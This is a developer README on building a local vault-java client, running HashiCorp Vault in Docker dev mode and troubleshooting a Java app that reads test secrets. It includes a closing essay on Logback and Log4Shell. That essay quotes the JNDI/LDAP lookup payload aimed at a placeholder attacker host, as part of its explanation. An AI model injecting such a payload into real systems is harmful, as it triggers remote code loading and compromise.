#### Info

this directory contains a replica of Hashicorp Vault Java Client (Bare) [se.jhaals:vault-java](https://github.com/jhaals/vault-java) (library is not officially published on Maven Central) Java implementation of the [Vault project](https://vaultproject.io/) HTTP API,  build locally, install and to use it in the small SFTP client loading private and public keys from Vault.
connected to the Alpine hosted HashiCorp Vault [running in Docker container](https://github.com/dweomer/dockerfiles-vault/blob/master/Dockerfile).

> NOTE The Sonatype OSSRH (Open Source Software Repository Hosting) service, which utilizes the /service/local/staging/deploy/maven2 endpoint, has undergone significant changes due to the sunset of Nexus Repository Manager 2 on June 30, 2025

The `https://ossrh-staging-api.central.sonatype.com/service/local/staging/deploy/maven2/se/jhaals/vault-java` is __401__ 


> NOTE the public key is nevet used locally, it is passed as argument required by the signature of the [method](https://commons.apache.org/proper/commons-vfs/commons-vfs2/apidocs/org/apache/commons/vfs2/provider/sftp/IdentityInfo.html)

There appears to be no plain java examples of how to integrate a Java application with HashiCorp Vault on [vendor repository]

### Usage

* Install the dependency (NOTE: skip the tests)

```
pushd vault-java; mvn -DskipTests package install; popd
```
ignore the error:

```text
pg: directory '/c/Users/kouzm/.gnupg' created
gpg: keybox '/c/Users/kouzm/.gnupg/pubring.kbx' created
gpg: no default secret key: No secret key
gpg: signing failed: No secret key
```
- the jar `vault-java-0.0.1.jar` will be placed into `~/.m2/repository/se/jhaals/vault-java/0.0.1`

> NOTE: there is a problem with the package "installed" this way:
```text
 Directory of c:\Users\kouzm\.m2\repository\se\jhaals\vault-java\0.0.1

05/17/2026  09:15 AM             6,878 vault-java-0.0.1.jar
               1 File(s)          6,878 bytes

 Directory of C:\developer\sergueik\springboot_study\basic-vault-plain\vault-java\target

05/17/2026  09:36 AM            13,052 vault-java-0.0.1.jar
```
```text
unzip -ql c:\Users\kouzm\.m2\repository\se\jhaals\vault-java\0.0.1\vault-java-0.0.1.jar
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2015-12-14 16:17   META-INF/
      131  2015-12-14 16:17   META-INF/MANIFEST.MF
      664  2015-12-13 21:42   Vault$ErrorResponse.class
      874  2015-12-13 21:42   Vault$Status.class
     4269  2015-12-13 21:42   Vault.class
      806  2015-12-11 17:28   VaultException.class
     1654  2015-12-11 17:28   VaultResponse.class
        0  2015-12-14 16:17   META-INF/maven/
        0  2015-12-14 16:17   META-INF/maven/se.jhaals/
        0  2015-12-14 16:17   META-INF/maven/se.jhaals/vault-java/
     5372  2015-12-14 16:16   META-INF/maven/se.jhaals/vault-java/pom.xml
      104  2015-12-11 17:28   META-INF/maven/se.jhaals/vault-java/pom.properties
---------                     -------
    13874                     12 files
```
```unzip -ql target\vault-java-0.0.1.jar
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2026-05-17 09:36   META-INF/
      129  2026-05-17 09:36   META-INF/MANIFEST.MF
        0  2026-05-17 09:36   se/
        0  2026-05-17 09:36   se/jhaals/
     1554  2026-05-17 09:36   se/jhaals/TokenCreateRequest.class
     2315  2026-05-17 09:36   se/jhaals/TokenCreateRequestBuilder.class
     1486  2026-05-17 09:36   se/jhaals/TokenResponse.class
     2290  2026-05-17 09:36   se/jhaals/TokenResponseAuth.class
     2234  2026-05-17 09:36   se/jhaals/TokenResponseData.class
      694  2026-05-17 09:36   se/jhaals/Vault$ErrorResponse.class
     6603  2026-05-17 09:36   se/jhaals/Vault.class
      826  2026-05-17 09:36   se/jhaals/VaultException.class
     1674  2026-05-17 09:36   se/jhaals/VaultResponse.class
     1316  2026-05-17 09:36   se/jhaals/VaultStatus.class
        0  2026-05-17 09:36   META-INF/maven/
        0  2026-05-17 09:36   META-INF/maven/se.jhaals/
        0  2026-05-17 09:36   META-INF/maven/se.jhaals/vault-java/
     5519  2026-05-16 15:07   META-INF/maven/se.jhaals/vault-java/pom.xml
      109  2026-05-17 09:36   META-INF/maven/se.jhaals/vault-java/pom.properties
---------                     -------
    26749                     19 files

```
therefore the `pom.xml` was modified to skip the signing (a better way may be possible)
Also, the `doc` was commended too to avoid troubleshooting of:
```text
ERROR] Failed to execute goal org.apache.maven.plugins:maven-javadoc-plugin:2.10.3:jar
(attach-javadocs) on project vault-java: MavenReportException: 
Error while generating Javadoc: Unable to find javadoc command: 
The environment variable JAVA_HOME is not correctly set. -> [Help 1]
```

* build the application
```sh
pushd app;  mvn clean package; popd
```

the steps to configure the Vault and `bootstrap.properties` are covered in [youtube video](https://youtu.be/MaTDiKp_IrA)

### Usage

* build the image with Java and Vault applications
```sh
export IMAGE=basic-vault
docker build --build-arg "GID=$(id -g)" --build-arg "UID=$(id -u)" -t $IMAGE -f Dockerfile .
```
* NOTE: on a Windows host the values returned by `id` will be big integer numbers like `197609`. On a Linux host you will posibly see numbers like `1000`

* run the container interactively, override the entry point, and exposing the default port, to execute vault commands in the foreground
```sh
NAME=vault-container
docker run --rm --name $NAME --entrypoint "" -p 8200:8200 -it $IMAGE sh
```
```sh
vault -version
```
```text
Vault v1.12.2 (415e1fe3118eebd5df6cb60d13defdc01aa17b03), built 2022-11-23T12:53:46Z
```
* start dev server with options
```sh
TOKEN=$(echo 'vault token' | base64 -)
echo $TOKEN
vault server -dev -dev-listen-address=0.0.0.0:8200 -dev-root-token-id=$TOKEN
```
this will print to console
```text
The unseal key and root token are displayed below in case you want to
seal/unseal the Vault or re-authenticate.

Unseal Key: t1Pz89JEGcc4p/tYrJYlKEFFVLbHQ4kD+diNMQ6f2LE=
Root Token: dmF1bHQgdG9rZW4K

Development mode should NOT be used in production installations!
```
and vault will remain running

If the key was changed extract it while running shell on the host:
```sh
sed -n 's/spring.cloud.vault.token=//p'  src/main/resources/bootstrap.properties
```
```text
dmF1bHQgdG9rZW4K
```
then in the container use the value
```sh
TOKEN=c7e6d2f3-dc1a-a841-cf29-0cf7bec8ed42
# TOKEN=$(echo $TOKEN | base64 -)
export VAULT_TOKEN=$TOKEN
NAME=vault-container
vault server -dev -dev-listen-address=0.0.0.0:8200 -dev-root-token-id=$TOKEN
```
it will confiem with:
```text
Unseal Key: EiLAvK66x2sehBq6PM8lAJPHYzriM7Jy/W0PtgJtUJE=
Root Token: c7e6d2f3-dc1a-a841-cf29-0cf7bec8ed42

Development mode should NOT be used in production installations!
```
* NOTE: a simple PLAIN strings like 'example' do not always work - but the problem will only be discovered in runtime through observed Java aplication failure

```sh
docker ps
```
```text
CONTAINER ID   IMAGE                        COMMAND            CREATED          STATUS          PORTS                                         NAMES
6ebca1b66830   basic-vault                  "sh"               4 minutes ago    Up 4 minutes    0.0.0.0:8200->8200/tcp, [::]:8200->8200/tcp   vault-container
```

```sh
export VAULT_ADDR=http://127.0.0.1:8200/
TOKEN=c7e6d2f3-dc1a-a841-cf29-0cf7bec8ed42
# TOKEN=$(echo $TOKEN | base64 -)
export VAULT_TOKEN=$TOKEN
NAME=vault-container
docker exec -e VAULT_TOKEN=$TOKEN -e VAULT_ADDR=http://127.0.0.1:8200/ $NAME vault kv get secret/application
```


this wll print
```text
No value found at secret/data/application
```
```
docker exec -e VAULT_TOKEN=$TOKEN -e VAULT_ADDR=http://127.0.0.1:8200/ $NAME vault kv put secret/application public_key=testuser secret_key=test123
```
===== Secret Path =====
secret/data/application

======= Metadata =======
Key                Value
---                -----
created_time       2026-05-17T15:36:19.427219926Z
custom_metadata    <nil>
deletion_time      n/a
destroyed          false
version            1

```
repeat
```sh
docker exec -e VAULT_TOKEN=$TOKEN -e VAULT_ADDR=http://127.0.0.1:8200/ $NAME vault kv get secret/application
===== Secret Path =====
secret/data/application

======= Metadata =======
Key                Value
---                -----
created_time       2026-05-17T15:36:19.427219926Z
custom_metadata    <nil>
deletion_time      n/a
destroyed          false
version            1

======= Data =======
Key           Value
---           -----
public_key    testuser
secret_key    test123

```
* print the full JSON
```sh
vault kv get -format=json secret/application| jq -r '.'
```
this will print
```json

{
  "request_id": "1082b408-df32-2079-93b9-9e5691ac3769",
  "lease_id": "",
  "lease_duration": 0,
  "renewable": false,
  "data": {
    "data": {
      "login": "testuser",
      "password": "test123"
    },
    "metadata": {
      "created_time": "2023-07-06T01:38:37.055689815Z",
      "custom_metadata": null,
      "deletion_time": "",
      "destroyed": false,
      "version": 5
    }
  },
  "warnings": null
}
```
alternatively create and observe via UI:

![Configured Application Secrets](https://github.com/sergueik/springboot_study/blob/master/basic-spring-vault/screenshots/capture-secret.png)

![Secret Value Displayed](https://github.com/sergueik/springboot_study/blob/master/basic-spring-vault/screenshots/capture-secret2.png)

run the application on development host

```sh
pushd app
java -cp target/vault-0.1.0-SNAPSHOT.jar:target/lib/* example.Application -token c7e6d2f3-dc1a-a841-cf29-0cf7bec8ed42 -server localhost -port 8200 2>&1 |tee a.log
```

this will fail
```text
May 17, 2026 10:58:22 AM org.glassfish.jersey.internal.Errors logErrors
WARNING: The following warnings have been detected: WARNING: HK2 service reification failed for [org.glassfish.jersey.message.internal.DataSourceProvider] with an exception:
MultiException stack 1 of 2
java.lang.NoClassDefFoundError: javax/activation/DataSource
	at java.base/java.lang.Class.getDeclaredConstructors0(Native Method)
	at java.base/java.lang.Class.privateGetDeclaredConstructors(Class.java:3137)
	at java.base/java.lang.Class.getDeclaredConstructors(Class.java:2357)
	at org.jvnet.hk2.internal.Utilities$3.run(Utilities.java:1310)
	at org.jvnet.hk2.internal.Utilities$3.run(Utilities.java:1306)
	at java.base/java.security.AccessController.doPrivileged(Native Method)
	at org.jvnet.hk2.internal.Utilities.getAllConstructors(Utilities.java:1306)
	at org.jvnet.hk2.internal.Utilities.findProducerConstructor(Utilities.java:1249)
	at org.jvnet.hk2.internal.DefaultClassAnalyzer.getConstructor(DefaultClassAnalyzer.java:82)
	at org.glassfish.jersey.internal.inject.JerseyClassAnalyzer.getConstructor(JerseyClassAnalyzer.java:144)
	at org.jvnet.hk2.internal.Utilities.getConstructor(Utilities.java:180)
	at org.jvnet.hk2.internal.ClazzCreator.initialize(ClazzCreator.java:129)
	at org.jvnet.hk2.internal.ClazzCreator.initialize(ClazzCreator.java:182)
	at org.jvnet.hk2.internal.SystemDescriptor.internalReify(SystemDescriptor.java:723)
	at org.jvnet.hk2.internal.SystemDescriptor.reify(SystemDescriptor.java:678)
	at org.jvnet.hk2.internal.ServiceLocatorImpl.reifyDescriptor(ServiceLocatorImpl.java:416)
	at org.jvnet.hk2.internal.ServiceLocatorImpl.narrow(ServiceLocatorImpl.java:2146)
	at org.jvnet.hk2.internal.ServiceLocatorImpl.access$1000(ServiceLocatorImpl.java:120)
	at org.jvnet.hk2.internal.ServiceLocatorImpl$9.compute(ServiceLocatorImpl.java:1281)
	at org.jvnet.hk2.internal.ServiceLocatorImpl$9.compute(ServiceLocatorImpl.java:1276)
	at org.glassfish.hk2.utilities.cache.LRUHybridCache$OriginThreadAwareFuture$1.call(LRUHybridCache.java:115)
	at org.glassfish.hk2.utilities.cache.LRUHybridCache$OriginThreadAwareFuture$1.call(LRUHybridCache.java:111)
	at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
	at org.glassfish.hk2.utilities.cache.LRUHybridCache$OriginThreadAwareFuture.run(LRUHybridCache.java:173)
	at org.glassfish.hk2.utilities.cache.LRUHybridCache.compute(LRUHybridCache.java:292)
	at org.jvnet.hk2.internal.ServiceLocatorImpl.internalGetAllServiceHandles(ServiceLocatorImpl.java:1354)
	at org.jvnet.hk2.internal.ServiceLocatorImpl.getAllServiceHandles(ServiceLocatorImpl.java:1263)
	at org.jvnet.hk2.internal.ServiceLocatorImpl.getAllServiceHandles(ServiceLocatorImpl.java:1252)
	at org.glassfish.jersey.internal.inject.Providers.getServiceHandles(Providers.java:354)
	at org.glassfish.jersey.internal.inject.Providers.getCustomProviders(Providers.java:201)
	at org.glassfish.jersey.message.internal.MessageBodyFactory.<init>(MessageBodyFactory.java:221)
	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:490)
	at org.glassfish.hk2.utilities.reflection.ReflectionHelper.makeMe(ReflectionHelper.java:1129)
	at org.jvnet.hk2.internal.ClazzCreator.createMe(ClazzCreator.java:274)
	at org.jvnet.hk2.internal.ClazzCreator.create(ClazzCreator.java:368)
	at org.jvnet.hk2.internal.SystemDescriptor.create(SystemDescriptor.java:471)
	at org.jvnet.hk2.internal.SingletonContext$1.compute(SingletonContext.java:82)
	at org.jvnet.hk2.internal.SingletonContext$1.compute(SingletonContext.java:70)
	at org.glassfish.hk2.utilities.cache.Cache$OriginThreadAwareFuture$1.call(Cache.java:97)
	at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
	at org.glassfish.hk2.utilities.cache.Cache$OriginThreadAwareFuture.run(Cache.java:154)
	at org.glassfish.hk2.utilities.cache.Cache.compute(Cache.java:199)
	at org.jvnet.hk2.internal.SingletonContext.findOrCreate(SingletonContext.java:121)
	at org.jvnet.hk2.internal.Utilities.createService(Utilities.java:2064)
	at org.jvnet.hk2.internal.ServiceLocatorImpl.internalGetService(ServiceLocatorImpl.java:711)
	at org.jvnet.hk2.internal.ServiceLocatorImpl.getService(ServiceLocatorImpl.java:661)
	at org.jvnet.hk2.internal.IterableProviderImpl.get(IterableProviderImpl.java:108)
	at org.glassfish.jersey.client.RequestProcessingInitializationStage.apply(RequestProcessingInitializationStage.java:97)
	at org.glassfish.jersey.client.RequestProcessingInitializationStage.apply(RequestProcessingInitializationStage.java:67)
	at org.glassfish.jersey.process.internal.Stages$LinkedStage.apply(Stages.java:308)
	at org.glassfish.jersey.process.internal.Stages.process(Stages.java:171)
	at org.glassfish.jersey.client.ClientRuntime.invoke(ClientRuntime.java:245)
	at org.glassfish.jersey.client.JerseyInvocation$2.call(JerseyInvocation.java:687)
	at org.glassfish.jersey.internal.Errors.process(Errors.java:315)
	at org.glassfish.jersey.internal.Errors.process(Errors.java:297)
	at org.glassfish.jersey.internal.Errors.process(Errors.java:228)
	at org.glassfish.jersey.process.internal.RequestScope.runInScope(RequestScope.java:444)
	at org.glassfish.jersey.client.JerseyInvocation.invoke(JerseyInvocation.java:683)
	at org.glassfish.jersey.client.JerseyInvocation$Builder.method(JerseyInvocation.java:411)
	at org.glassfish.jersey.client.JerseyInvocation$Builder.get(JerseyInvocation.java:307)
	at se.jhaals.Vault.read(Vault.java:66)
	at example.Application.main(Application.java:62)

```
fix by adding dependencies removed in Java __11__

```text
se.jhaals.VaultException null
	at se.jhaals.Vault.read(Vault.java:73)
	at example.Application.main(Application.java:62)
```


```sh
java -cp target/vault-0.1.0-SNAPSHOT.jar:target/lib/* example.Application -token c7e6d2f3-dc1a-a841-cf29-0cf7bec8ed42 -server localhost -dir secret/application  -port 8200 2>&1 |tee a.log
/v1/secret/application
```
```text
HTTP Status:404
javax.ws.rs.ProcessingException: Error reading entity from input stream. Error reading entity from input stream.
javax.ws.rs.ProcessingException: Error reading entity from input stream.

```
```sh
java -cp target/vault-0.1.0-SNAPSHOT.jar:target/lib/* example.Application -token c7e6d2f3-dc1a-a841-cf29-0cf7bec8ed42 -server localhost -dir secret/data/application  -port 8200 2>&1 |tee a.log
/v1/secret/data/application
/v1/secret/data/application
HTTP Status: 200
HTTP-Read: 
{
  "request_id": "162d5ea8-eb01-d9eb-4a51-1195811d5b3f",
  "lease_id": "",
  "renewable": false,
  "lease_duration": 0,
  "data": {
    "data": {
      "public_key": "testuser",
      "secret_key": "test123"
    },
    "metadata": {
      "created_time": "2026-05-17T15:36:19.427219926Z",
      "custom_metadata": null,
      "deletion_time": "",
      "destroyed": false,
      "version": 1
    }
  },
  "wrap_info": null,
  "warnings": null,
  "auth": null
}


javax.ws.rs.ProcessingException: Error reading entity from input stream. Error reading entity from input stream.
javax.ws.rs.ProcessingException: Error reading entity from input stream.
	at org.glassfish.jersey.message.internal.InboundMessageContext.readEntity(InboundMessageContext.java:868)
	at org.glassfish.jersey.message.internal.InboundMessageContext.readEntity(InboundMessageContext.java:785)
	at org.glassfish.jersey.client.ClientResponse.readEntity(ClientResponse.java:326)
	at org.glassfish.jersey.client.InboundJaxrsResponse$1.call(InboundJaxrsResponse.java:111)
	at org.glassfish.jersey.internal.Errors.process(Errors.java:315)
	at org.glassfish.jersey.internal.Errors.process(Errors.java:297)
	at org.glassfish.jersey.internal.Errors.process(Errors.java:228)
	at org.glassfish.jersey.process.internal.RequestScope.runInScope(RequestScope.java:419)
	at org.glassfish.jersey.client.InboundJaxrsResponse.readEntity(InboundJaxrsResponse.java:108)
	at se.jhaals.Vault.read(Vault.java:71)
	at example.Application.main(Application.java:62)
Caused by: com.fasterxml.jackson.databind.JsonMappingException: Can not deserialize instance of java.lang.String out of START_OBJECT token
 at [Source: org.glassfish.jersey.message.internal.ReaderInterceptorExecutor$UnCloseableInputStream@1890516e; line: 1, column: 113] (through reference chain: se.jhaals.VaultResponse["data"]->java.util.LinkedHashMap["data"])
	at com.fasterxml.jackson.databind.JsonMappingException.from(JsonMappingException.java:148)
	at com.fasterxml.jackson.databind.DeserializationContext.mappingException(DeserializationContext.java:835)
	at com.fasterxml.jackson.databind.deser.std.StringDeserializer.deserialize(StringDeserializer.java:59)
	at com.fasterxml.jackson.databind.deser.std.StringDeserializer.deserialize(StringDeserializer.java:12)
	at com.fasterxml.jackson.databind.deser.std.MapDeserializer._readAndBindStringMap(MapDeserializer.java:473)
	at com.fasterxml.jackson.databind.deser.std.MapDeserializer.deserialize(MapDeserializer.java:330)
	at com.fasterxml.jackson.databind.deser.std.MapDeserializer.deserialize(MapDeserializer.java:25)
	at com.fasterxml.jackson.databind.deser.SettableBeanProperty.deserialize(SettableBeanProperty.java:523)
	at com.fasterxml.jackson.databind.deser.impl.FieldProperty.deserializeAndSet(FieldProperty.java:101)
	at com.fasterxml.jackson.databind.deser.impl.BeanPropertyMap.findDeserializeAndSet(BeanPropertyMap.java:285)
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.vanillaDeserialize(BeanDeserializer.java:248)
	at com.fasterxml.jackson.databind.deser.BeanDeserializer.deserialize(BeanDeserializer.java:136)
	at com.fasterxml.jackson.databind.ObjectReader._bind(ObjectReader.java:1408)
	at com.fasterxml.jackson.databind.ObjectReader.readValue(ObjectReader.java:858)
	at com.fasterxml.jackson.jaxrs.base.ProviderBase.readFrom(ProviderBase.java:808)
	at org.glassfish.jersey.message.internal.ReaderInterceptorExecutor$TerminalReaderInterceptor.invokeReadFrom(ReaderInterceptorExecutor.java:266)
	at org.glassfish.jersey.message.internal.ReaderInterceptorExecutor$TerminalReaderInterceptor.aroundReadFrom(ReaderInterceptorExecutor.java:236)
	at org.glassfish.jersey.message.internal.ReaderInterceptorExecutor.proceed(ReaderInterceptorExecutor.java:156)
	at org.glassfish.jersey.message.internal.MessageBodyFactory.readFrom(MessageBodyFactory.java:1085)
	at org.glassfish.jersey.message.internal.InboundMessageContext.readEntity(InboundMessageContext.java:853)


```

this will print to console the starnard Spring banned and possibly few ignorable warnings, then print the sensitive data received from Vault:
```text
Login: testuser
Password: test123

```
### See Also:

   * another zero-dependency [Java client](https://jopenlibs.github.io/vault-java-drive) for the Vault
   * [HashiCorp Vault client library in C#](https://github.com/hashicorp/vault-client-dotnet)
  * __Hashicorp Vault__
     + [Getting Started with Vault](https://app.pluralsight.com/lti-integration/redirect/3134d6b5-8d8f-48fe-9251-b3ec443fa9f5)(qwicklab)

     + [Managing Vault Tokens](https://app.pluralsight.com/lti-integration/redirect/adb24492-f4c6-4417-baab-50e212f1522e)(qwicklab)

     + [Interacting with Vault Policies](https://app.pluralsight.com/lti-integration/redirect/382af62b-8ffd-45ce-954c-3f27ae116189)(qwicklab)

     + [Authentication, Authorization, and Identity with Vault](https://app.pluralsight.com/lti-integration/redirect/4152971b-ee4e-4f56-bc6d-5055197e2b4a)(qwicklab)

     + [Creating Dynamic Secrets for Google Cloud with Vault](https://app.pluralsight.com/lti-integration/redirect/eb4f5638-7458-4b95-95ef-23067291c0af)(qwicklab) `GSP1007`

  * [An Intro to Vault](https://www.baeldung.com/vault)

 
### Unrelated

Because modern systems are full of unavoidable “boundary crossings” between:

  * protected memory
  * kernel memory
  * user memory
  * encrypted storage
  * network buffers
  * DMA/device memory
  * containers/VMs
  * secure enclaves
  * language runtimes

And every boundary crossing eventually becomes:

“copy bytes from A to B safely.”

That sounds trivial, but in systems programming it is one of the hardest things to do perfectly at scale.

Logback was created by Ceki Gülcü — the original author of Log4j.

So it was not:

"totally different competing project"

It was more:

"second-generation redesign after limitations of Log4j 1.x became apparent."

That is why many people historically described it as:

  * *Log4j done properly*
  * *Log4j evolved*
  * *what Log4j 2 should have been*


fundamentally, __Logback__ was not vulnerable in the same architectural way as the infamous Log4Shell vulnerability in Log4j 2.x.

That is one reason many engineers later said:

*Logback accidentally avoided an entire class of disaster*

roughly: `${jndi:ldap://attacker/...}` inside logged data could trigger remote lookups.

That crossed several boundaries at once:

  * logging
  * naming services
  * remote loading
  * string templating
  * runtime evaluation

The ecosystem later realized: *Why was a logger capable of doing this at all?*


### Author
[Serguei Kouzmine](kouzmine_serguei@yahoo.com)
